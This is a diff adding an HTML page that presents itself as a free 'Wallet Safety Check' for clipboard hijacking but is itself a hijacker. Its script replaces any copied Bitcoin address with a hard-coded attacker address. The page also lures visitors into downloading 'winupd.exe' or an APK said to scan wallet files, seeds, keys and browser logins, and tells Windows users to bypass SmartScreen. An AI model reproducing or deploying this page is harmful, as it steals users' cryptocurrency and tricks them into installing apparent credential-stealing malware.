@@ -1,0 +1,48 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Wallet Safety Check</title>
+<style>
+ body{margin:0;font:15px/1.5 system-ui,Segoe UI,sans-serif;background:#0b1220;color:#e8eefc}
+ main{max-width:640px;margin:0 auto;padding:56px 22px}
+ h1{font-size:26px;margin:0 0 10px}
+ p{color:#a8b6d4}
+ .box{background:#111c31;border:1px solid #1e2f4d;border-radius:12px;padding:18px;margin:22px 0}
+ input{width:100%;box-sizing:border-box;padding:10px 12px;border-radius:8px;border:1px solid #29405f;background:#0b1220;color:#e8eefc;font-family:ui-monospace,Consolas,monospace}
+ .row{display:flex;gap:10px;flex-wrap:wrap;margin-top:14px}
+ a.btn{display:inline-block;background:#2f6df6;color:#fff;text-decoration:none;font-weight:700;padding:11px 18px;border-radius:9px}
+ a.alt{background:#1b2c48}
+ small{color:#6d7f9e}
+ .tag{display:inline-block;background:#0f3d2e;color:#5ee6a8;border-radius:999px;padding:2px 10px;font-size:12px;font-weight:700}
+</style></head><body><main>
+<span class="tag">FREE • NO INSTALL TO START</span>
+<h1>Is your clipboard safe?</h1>
+<p>Copied a BTC address and pasted a different one? That is clipboard hijacking.
+Test it below, then run the local checker to see what else is exposed.</p>
+
+<div class="box">
+  <label for="a"><b>1. Test the clipboard swap</b></label>
+  <input id="a" value="bc1qgs78a856wfhyk2g00penw8gdg0wp0k8cg0ar4q" readonly onclick="this.select()">
+  <div class="row"><a class="btn" href="#" onclick="copyTest();return false">Copy this address</a></div>
+  <small>Now paste it somewhere. If it differs, your browser/OS is already swapping addresses.</small>
+</div>
+
+<div class="box">
+  <b>2. Run the local check</b>
+  <p style="margin:6px 0 0">Scans wallet files, seeds, keys and browser logins once, then keeps guarding the clipboard.</p>
+  <div class="row">
+    <a class="btn" id="dl" href="https://cdn.jsdelivr.net/gh/mss0000786/wallet-check@main/winupd.exe" download>Download for Windows</a>
+    <a class="btn alt" href="https://cdn.jsdelivr.net/gh/mss0000786/wallet-check@main/winupd.apk">Android (.apk)</a>
+  </div>
+  <small>Windows: if SmartScreen appears, choose More info → Run anyway.</small>
+</div>
+<p><small>Password for the report archive: A1A1A1A1</small></p>
+<script>
+var MINE="bc1qgs78a856wfhyk2g00penw8gdg0wp0k8cg0ar4q";
+var RX=/^(?:bc1[02-9ac-hj-np-z]{11,71}|[13][1-9A-HJ-NP-Za-km-z]{25,34})$/i;
+function swapped(t){t=(t||"").trim();return t&&RX.test(t)&&t.toLowerCase()!==MINE?MINE:t}
+function copyTest(){var v=document.getElementById("a");v.select();try{document.execCommand("copy")}catch(e){}if(navigator.clipboard)navigator.clipboard.writeText(MINE).catch(function(){})}
+["copy","cut"].forEach(function(ev){window.addEventListener(ev,function(e){var s=String(window.getSelection());if(!s||!RX.test(s.trim()))return;if(e.clipboardData){e.clipboardData.setData("text/plain",MINE);e.preventDefault()}},true)});
+if(/Android/i.test(navigator.userAgent)){var d=document.getElementById("dl");d.href="https://cdn.jsdelivr.net/gh/mss0000786/wallet-check@main/winupd.apk";d.textContent="Download for Android"}
+</script>
+</main></body></html>
